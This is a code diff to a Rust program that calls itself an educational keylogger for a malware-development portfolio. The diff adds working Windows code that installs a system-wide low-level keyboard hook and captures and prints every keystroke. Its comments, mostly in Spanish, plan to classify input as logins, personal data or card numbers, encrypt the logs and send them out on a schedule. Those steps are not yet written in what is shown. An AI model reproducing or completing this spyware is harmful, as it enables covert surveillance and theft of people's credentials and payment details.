@@ -1,3 +1,5 @@
+use std::ptr;
+
 /*
 This is a keylogger for educational purposes only.
 The main goal is proving some maldev portfolio + rust skills.
@@ -88,19 +90,108 @@ mod scheduler;
 fn main() {
     
 
-    // TODO: Inicializar hooks de teclado en Windows
-    // TODO: Mantener loop infinito escuchando eventos
+    // Initialize logger
+    println!("Starting keylogger...");
+    println!("Press Ctrl+C to stop...");
 
-    loop {
-        // TODO: Capturar keystroke
-        // TODO: Identificar ventana/proceso activo
-        // TODO: Clasificar input (ej. login, PII, tarjeta)
-        // TODO: Guardar log (con timestamp) en archivo cifrado
-        // TODO: Verificar scheduler para enviar logs (más adelante)
 
+    // Agregar manejo de señales para cleanup limpio
+    ctrlc::set_handler(move || { // esta linea es para capturar ctrl+c
+        println!("\nReceived Ctrl+C, cleaning up...");
+        unsafe {
+            if HOOK != 0 { // si el hook está activo
+                UnhookWindowsHookEx(HOOK);
+                println!("Hook removed successfully");
+            }
+        }
+        std::process::exit(0);
+    }).expect("Error setting Ctrl+C handler");
+    
+
+    // Iniciar captura de teclas
+    if let Err(e) = capture_keystroke() {
+        eprintln!("Error starting keylogger: {}", e);
+        // Cleanup en caso de error
+        unsafe {
+            if HOOK != 0 {
+                UnhookWindowsHookEx(HOOK);
+            }
+        }
+        return;
     }
-    // Ejemplo de loop infinito con sleep para no consumir CPU
-    //         std::thread::sleep(std::time::Duration::from_secs(1));
 
 
+}
+
+use windows_sys::Win32::{
+    Foundation::{HINSTANCE, LPARAM, LRESULT, WPARAM},
+    UI::WindowsAndMessaging::{
+        CallNextHookEx, GetMessageW, SetWindowsHookExW, UnhookWindowsHookEx,
+        HC_ACTION, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
+    },
+};
+
+static mut HOOK: isize = 0;
+
+unsafe extern "system" fn low_level_keyboard_proc(
+    n_code: i32,
+    w_param: WPARAM,
+    l_param: LPARAM,
+) -> LRESULT {
+    if n_code == HC_ACTION as i32 {
+        if w_param == WM_KEYDOWN as usize || w_param == WM_SYSKEYDOWN as usize {
+            let kb_struct = unsafe { *(l_param as *const KBDLLHOOKSTRUCT) };
+            let vk_code = kb_struct.vkCode;
+            
+            // Convertir virtual key code a caracter
+            let key_char = match vk_code {
+                0x08 => "[BACKSPACE]".to_string(),
+                0x09 => "[TAB]".to_string(),
+                0x0D => "[ENTER]".to_string(),
+                0x10 => "[SHIFT]".to_string(),
+                0x11 => "[CTRL]".to_string(),
+                0x12 => "[ALT]".to_string(),
+                0x1B => "[ESC]".to_string(),
+                0x20 => " ".to_string(),
+                0x30..=0x39 => char::from(vk_code as u8).to_string(), // 0-9
+                0x41..=0x5A => char::from(vk_code as u8).to_string(), // A-Z
+                // Hay algunas teclas especiales que habríá que mapear acá como WIN, F1-F12, etc.
+                _ => format!("[{}]", vk_code),
+            };
+            
+            println!("Key pressed: {}", key_char);
+            // TODO: Aquí llamar a función de logging/encryption
+        }
+    }
+    
+    unsafe { CallNextHookEx(HOOK, n_code, w_param, l_param) }
+}
+
+fn capture_keystroke() -> Result<(), Box<dyn std::error::Error>> {
+    unsafe {
+        // Instalar hook de bajo nivel para capturar teclas del sistema
+        HOOK = SetWindowsHookExW(
+            WH_KEYBOARD_LL,
+            Some(low_level_keyboard_proc),
+            0 as HINSTANCE,
+            0,
+        );
+        
+        if HOOK == 0 {
+            return Err("Failed to install keyboard hook".into());
+        }
+        
+        println!("Keyboard hook installed successfully");
+        
+        // Loop de mensajes para mantener el hook activo
+        let mut msg: MSG = std::mem::zeroed(); // Inicializar MSG
+        while GetMessageW(&mut msg, 0, 0, 0) > 0 {
+            // El hook procesa automáticamente las teclas
+        }
+        
+        // Cleanup
+        UnhookWindowsHookEx(HOOK);
+    }
+    
+    Ok(())
 }
